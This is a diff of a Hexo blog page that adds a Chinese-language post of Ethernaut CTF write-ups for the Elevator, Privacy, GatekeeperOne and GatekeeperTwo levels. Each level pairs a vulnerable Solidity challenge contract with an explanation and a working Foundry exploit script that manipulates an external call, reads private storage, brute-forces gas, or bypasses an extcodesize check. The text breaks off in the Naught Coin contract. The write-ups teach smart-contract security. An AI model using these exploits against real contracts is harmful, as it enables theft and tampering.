@@ -102,7 +102,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">2</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">1</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">2</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">2</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -165,7 +165,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -213,6 +213,181 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/29/ethernautP2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="D3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/01/29/ethernautP2/" class="post-title-link" itemprop="url">Ethernaut 11-15</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-01-29 00:00:00" itemprop="dateCreated datePublished" datetime="2026-01-29T00:00:00+08:00">2026-01-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-Ethernaut-Writeups/" itemprop="url" rel="index"><span itemprop="name">CTF-Ethernaut Writeups</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="资料库"><a href="#资料库" class="headerlink" title="资料库"></a>资料库</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.openzeppelin.com/news/deconstructing-a-solidity-smart-contract-part-i-introduction-832efd2d7737">解构Solidity Contract</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://medium.com/@tanner.dev/%E5%8E%9F%E4%BE%86%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E5%8F%AF%E4%BB%A5%E5%8D%87%E7%B4%9A-%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82-contract-proxy-pattern-%E7%9A%84-tpp-uups-dcc4ccbe4f16">合约升级,TPP、UUPS</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.alchemy.com/docs/blockchain-basics">Alchemy关于Web3的基础</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.alchemy.com/docs/smart-contract-storage-layout#what-is-contract-storage-layout-and-why-does-it-matter">What is Smart Contract Storage Layout?</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh-cn/v0.8.24/types.html#types-conversion-literals">关于Solidity类型转换</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://ethereum.org/zh/developers/docs/">ETH开发文档</a></p>
+</li>
+</ul>
+<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通关条件是让<code>top</code>为真.</p>
+<p>这一道题目是关于<code>External Call </code>的安全性，题目对于接口函数<code>building.isLastFloor(uint256)</code>的使用是没有检查的.</p>
+<p>根据代码的理解就是让接口函数第一次返回<code>false</code>第二次返回<code>true</code>.</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">interface IBuilding &#123;</span><br><span class="line">    function goTo(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorSolution is Script &#123;</span><br><span class="line">    Elevator elevator = Elevator(InstanceAddress);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        ElevatorAttack elevatorAttack = new ElevatorAttack(address(elevator));</span><br><span class="line">        elevatorAttack.attack();</span><br><span class="line">        console.log(&quot;bool top&quot;, elevator.top());</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorAttack &#123;</span><br><span class="line">    Elevator private immutable i_elevator;</span><br><span class="line">    uint8 counter = 1;</span><br><span class="line"></span><br><span class="line">    constructor(address _instanceAddress) public &#123;</span><br><span class="line">        i_elevator = Elevator(_instanceAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256 _floor) external returns (bool) &#123;</span><br><span class="line">        if (counter &lt; 2) &#123;</span><br><span class="line">            counter++;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        i_elevator.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>通关要求<code>locked</code>为<code>False</code></p>
+<p>考察对于<code>Layout of State Variables in Storage</code>，先计算目标<code>key</code>在哪个<code>slot</code>接着就是提取内容，再<code>call</code>函数调用。</p>
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202512141507568.png" alt="image-20251214150654394"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;../src/Privacy.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * //  bool：1 byte</span><br><span class="line"> * // address：20 bytes</span><br><span class="line"> * // uint256 / int256：32 bytes</span><br><span class="line"> * // uint8 / int8：1 byte (后缀数字除以 8 依此类推)</span><br><span class="line"> * // 固定大小的 bytes1 / bytes2 / … / bytes32：大小等同后缀數字</span><br><span class="line"> * // 固定陣列 bytes32[3]：每個元素皆 bytes32 (取決数组的元素长度)</span><br><span class="line"> */</span><br><span class="line">contract PrivacySolution is Script &#123;</span><br><span class="line">    function run() public &#123;</span><br><span class="line">        Privacy privacy = Privacy(InstanceAddress);</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));</span><br><span class="line">        console.log(&quot;key&quot;, uint256(key));</span><br><span class="line">        address(privacy).call(abi.encodeWithSignature(&quot;unlock(bytes16)&quot;, bytes16(key)));</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GatekeeperOne"><a href="#GatekeeperOne" class="headerlink" title="GatekeeperOne"></a>GatekeeperOne</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>在了解了一定的solidity类型转换的原理后，<code>gateone</code>通过条件很简单只要用合约呼叫就可以通过,<code>gatetwo</code>中存在全局变量<code>gasleft()</code>表示交易中剩余的Gas费用.</p>
+<p>对于<code>gasleft() % 8191 == 0</code>条件只需要在使用call方式触发函数的时候设定确定的Gas接着Fuzz出正确的情况</p>
+<p>具体如下利用For循环</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">            (bool success,) =</span><br><span class="line">                address(gatekeeperOne).call&#123;gas: i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));</span><br><span class="line">            if (success) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于<code>gateThree</code>需要满足以下三个条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202512191632571.png" alt="image-20251219163203409"></p>
+<p>观察第一个条件和第三个条件其实是大同小异的都是后面两个Byte跟<code>uint32(uint64(_gateKey)</code>相同，前面的bytes不需要管，因为存在类型转换的填充技术，会用00补上。</p>
+<p>第二个条件就是需要满足<code>uint32(uint64(_gateKey)</code>从右往左数第三第四个Byte不与<code>uint64(_gateKey)</code>相同,所以这里使用<code>AND</code>运算</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 AND 0   // 0</span><br><span class="line">0 AND 1   // 0</span><br><span class="line">1 AND 0   // 0</span><br><span class="line">1 AND 1   // 1</span><br><span class="line"></span><br><span class="line">bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract GatekeeperOneSolution is Script &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne = GatekeeperOne(0x69e4C5489391A439f0C690d9328070eD91680C28);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        GatekeeperOneAttack attack = new GatekeeperOneAttack(gatekeeperOne);</span><br><span class="line">        attack.attack();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line"></span><br><span class="line">    constructor(GatekeeperOne _gatekeeperOne) &#123;</span><br><span class="line">        gatekeeperOne = _gatekeeperOne;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        bytes8 key = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;</span><br><span class="line">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">            (bool success,) =</span><br><span class="line">                address(gatekeeperOne).call&#123;gas: i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));</span><br><span class="line">            if (success) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GatekeeperTwo"><a href="#GatekeeperTwo" class="headerlink" title="GatekeeperTwo"></a>GatekeeperTwo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p><code>gateTwo()</code>:一个内联汇编块由 <code>assembly { ... }</code> 标记的，其中大括号内的代码是 <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh-cn/v0.8.24/yul.html#yul">Yul</a> 语言中的代码。其中<code>extcodesize(caller())</code>表示的是获取调用当前函数者（caller）相当于<code>msg.sender</code>地址上的代码大小（字节数）。在以太坊中，一个合约的“代码”只有在构造函数（Constructor）完全执行结束之后，才会真正存储到区块链上。</p>
+<p>核心机制：Init Code vs Runtime Code<br>在 EVM 层面，智能合约的代码分为两部分：</p>
+<ol>
+<li><strong>初始化代码 (Creation Code &#x2F; Init Code)</strong>：<ul>
+<li>这是包含 <code>constructor</code> 逻辑的代码。</li>
+<li>它的作用是<strong>生成</strong>并<strong>返回</strong>最终要存储在链上的代码。</li>
+<li><strong>重点</strong>：当你在部署合约时，EVM 正在执行这部分代码。</li>
+</ul>
+</li>
+<li><strong>运行时代码 (Runtime Code)</strong>：<ul>
+<li>这是合约部署完成后，永久存储在区块链地址上的代码（也就是业务逻辑）。</li>
+<li><code>extcodesize</code> 统计的就是这部分代码的大小。</li>
+</ul>
+</li>
+</ol>
+<p>所以说只需要在合约构造函数中实现攻击，就可以绕过检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>gateThree()</code>：已知等式<code>a ^ b = c</code>可以得到<code>a ^ c = b</code>，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &quot;../src/GatekeeperTwo.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoSolution is Script &#123;</span><br><span class="line">    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0x6abe30b40bFbC5377EbF15eC708c4Fa25B31d0b4);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        GatekeeperTwoAttack attack = new GatekeeperTwoAttack(gatekeeperTwo);</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">    GatekeeperTwo gatekeeperTwo;</span><br><span class="line"></span><br><span class="line">    //require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    //uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max ==  uint64(_gateKey)</span><br><span class="line"></span><br><span class="line">    constructor(GatekeeperTwo _gatekeeperTwo) &#123;</span><br><span class="line">        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);</span><br><span class="line">        gatekeeperTwo = _gatekeeperTwo;</span><br><span class="line">        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        